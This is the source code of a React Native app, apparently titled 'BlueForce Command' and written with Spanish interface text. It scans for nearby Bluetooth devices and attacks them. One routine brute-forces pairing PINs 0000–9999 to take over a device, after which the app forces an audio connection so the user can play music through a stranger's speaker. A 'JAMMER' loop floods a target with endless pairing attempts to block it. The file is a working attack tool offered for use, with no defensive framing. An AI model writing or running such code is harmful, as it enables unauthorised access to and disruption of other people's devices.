import React, { useState, useEffect } from 'react';
import { StyleSheet, Text, View, TouchableOpacity, ScrollView, Alert, PermissionsAndroid, Platform, FlatList, ActivityIndicator } from 'react-native';
import RNBluetoothClassic from 'react-native-bluetooth-classic';

const SignalMeter = ({ rssi }) => {
  let strength = 0;
  if (rssi > -50) strength = 5;
  else if (rssi > -65) strength = 4;
  else if (rssi > -75) strength = 3;
  else if (rssi > -85) strength = 2;
  else if (rssi > -100) strength = 1;
  const getColor = () => strength >= 4 ? '#00ff88' : strength === 3 ? '#ffea00' : '#ff3c00';
  return (
    <View style={styles.meterContainer}>
      {[1, 2, 3, 4, 5].map(b => (
        <View key={b} style={[styles.bar, { height: b * 3, backgroundColor: b <= strength ? getColor() : '#222' }]} />
      ))}
    </View>
  );
};

export default function App() {
  const [discoveredDevices, setDiscoveredDevices] = useState([]);
  const [history, setHistory] = useState({});
  const [activeTarget, setActiveTarget] = useState(null);
  const [isScanning, setIsScanning] = useState(false);
  const [mode, setMode] = useState('IDLE');
  const [currentPin, setCurrentPin] = useState('0000');
  const [logs, setLogs] = useState([]);

  const addLog = (msg) => setLogs(p => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...p].slice(0, 100));

  useEffect(() => {
    (async () => {
      if (Platform.OS === 'android') {
        await PermissionsAndroid.requestMultiple([
          PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
          PermissionsAndroid.PERMISSIONS.BLUETOOTH_SCAN,
          PermissionsAndroid.PERMISSIONS.BLUETOOTH_CONNECT,
        ]);
      }
    })();
  }, []);

  const updateHistory = (mac, status, pin = null) => {
    setHistory(prev => ({ ...prev, [mac]: { status, pin } }));
  };

  const scan = async () => {
    if (isScanning || mode !== 'IDLE') return;
    setIsScanning(true);
    setDiscoveredDevices([]);
    try {
      const devices = await RNBluetoothClassic.startDiscovery();
      setDiscoveredDevices(devices.sort((a, b) => b.rssi - a.rssi));
      addLog("✅ Escaneo finalizado.");
    } catch (err) { addLog(`⚠️ ERROR: ${err.message}`); }
    finally { setIsScanning(false); }
  };

  const startBruteForce = async (device) => {
    setActiveTarget(device.address);
    setMode('BRUTE');
    for (let i = 0; i <= 9999; i++) {
      let m; setMode(cur => { m = cur; return cur; });
      if (m !== 'BRUTE') break;
      const pin = i.toString().padStart(4, '0');
      setCurrentPin(pin);
      try {
        const ok = await RNBluetoothClassic.pairDevice(device.address, { pin });
        if (ok) {
          updateHistory(device.address, '🔓 CONQUISTADO', pin);
          addLog("🎯 ENCONTRADO PIN: " + pin);
          setMode('IDLE');
          setActiveTarget(null);
          Alert.alert("¡ÉXITO!", `Vínculo creado con PIN: ${pin}. Ya puedes usar Spotify o YouTube.`);
          return;
        }
      } catch (e) {
        if (i % 5 === 0) await new Promise(r => setTimeout(r, 600));
      }
    }
    setMode('IDLE');
    setActiveTarget(null);
  };

  const syncAudio = async (device) => {
    addLog(`🎵 Sincronizando Audio con ${device.address}...`);
    try {
      // Forzar conexión para perfil de audio (A2DP)
      await RNBluetoothClassic.connectDevice(device.address);
      addLog("🔥 AUDIO SINCRONIZADO. Pon tu música.");
      Alert.alert("LISTO", "Canal de audio abierto. Abre YouTube o Spotify.");
    } catch (e) {
      addLog("⚠️ Reintento de sincronización...");
      Alert.alert("AVISO", "Asegúrate de que el parlante no esté en uso por otra persona.");
    }
  };

  const startJammer = async (device) => {
    setActiveTarget(device.address);
    setMode('JAMMER');
    addLog(`🔥 JAMMER activo contra ${device.address}`);
    while (true) {
      let m; setMode(cur => { m = cur; return cur; });
      if (m !== 'JAMMER') break;
      try { await RNBluetoothClassic.pairDevice(device.address, { pin: '0' }); } catch (e) {}
    }
    setActiveTarget(null);
  };

  const renderItem = ({ item }) => {
    const h = history[item.address] || { status: '⚪ NUEVO' };
    const isConquered = h.status.includes('🔓');
    const isAnyActive = mode !== 'IDLE';

    return (
      <View style={styles.card}>
        <SignalMeter rssi={item.rssi} />
        <View style={{ flex: 1, marginLeft: 15 }}>
          <Text style={styles.name}>{item.name || "N/A"}</Text>
          <Text style={styles.mac}>{item.address}</Text>
          <Text style={[styles.historyText, { color: isConquered ? '#00ff88' : '#888' }]}>{h.status}</Text>
        </View>
        <View style={{ flexDirection: 'row' }}>
          {isConquered ? (
            <TouchableOpacity style={[styles.btnA, { backgroundColor: '#00f2ff' }]} onPress={() => syncAudio(item)}>
              <Text style={[styles.btnText, { color: '#000' }]}>AUD</Text>
            </TouchableOpacity>
          ) : (
            <>
              <TouchableOpacity style={styles.btnA} onPress={() => startBruteForce(item)} disabled={isAnyActive}>
                <Text style={styles.btnText}>PIN</Text>
              </TouchableOpacity>
              <TouchableOpacity style={[styles.btnA, { backgroundColor: '#ff0055', marginLeft: 5 }]} onPress={() => startJammer(item)} disabled={isAnyActive}>
                <Text style={styles.btnText}>BLOCK</Text>
              </TouchableOpacity>
            </>
          )}
        </View>
      </View>
    );
  };

  return (
    <View style={styles.container}>
      <Text style={styles.title}>BlueForce Command</Text>
      <View style={styles.main}>
        <Text style={styles.pin}>{mode === 'IDLE' ? 'READY' : currentPin}</Text>
        <TouchableOpacity style={styles.scanBtn} onPress={scan} disabled={isScanning || mode !== 'IDLE'}>
          {isScanning ? <ActivityIndicator color="#fff" /> : <Text style={styles.scanText}>ESCANEAR AREA</Text>}
        </TouchableOpacity>
      </View>
      <FlatList data={discoveredDevices} renderItem={renderItem} keyExtractor={i => i.address} />
      {mode !== 'IDLE' && <TouchableOpacity style={styles.stop} onPress={() => setMode('IDLE')}><Text style={styles.stopText}>ABORTAR</Text></TouchableOpacity>}
      <ScrollView style={styles.logs}>{logs.map((l, i) => <Text key={i} style={styles.logText}>{l}</Text>)}</ScrollView>
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#000', padding: 20, paddingTop: 40 },
  title: { color: '#00f2ff', fontSize: 24, fontWeight: 'bold', textAlign: 'center', marginBottom: 20 },
  main: { backgroundColor: '#111', padding: 20, borderRadius: 15, marginBottom: 20 },
  pin: { color: '#fff', fontSize: 40, fontWeight: 'bold', textAlign: 'center', marginBottom: 15 },
  scanBtn: { backgroundColor: '#00f2ff', padding: 15, borderRadius: 10, alignItems: 'center' },
  scanText: { color: '#000', fontWeight: 'bold' },
  card: { backgroundColor: '#181818', padding: 15, borderRadius: 12, marginBottom: 10, flexDirection: 'row', alignItems: 'center' },
  name: { color: '#fff', fontWeight: 'bold', fontSize: 13 },
  mac: { color: '#555', fontSize: 9 },
  historyText: { fontSize: 9, marginTop: 4, fontWeight: 'bold' },
  meterContainer: { flexDirection: 'row', alignItems: 'flex-end', width: 25 },
  bar: { width: 3, marginRight: 2, borderRadius: 1 },
  btnA: { backgroundColor: '#222', paddingVertical: 8, paddingHorizontal: 12, borderRadius: 8 },
  btnText: { color: '#fff', fontSize: 10, fontWeight: 'bold' },
  stop: { backgroundColor: '#ff0055', padding: 15, borderRadius: 12, alignItems: 'center', marginBottom: 15 },
  stopText: { color: '#fff', fontWeight: 'bold' },
  logs: { height: 80, backgroundColor: '#0a0a0a', padding: 10, borderRadius: 10 },
  logText: { color: '#444', fontSize: 9, marginBottom: 2 }
});
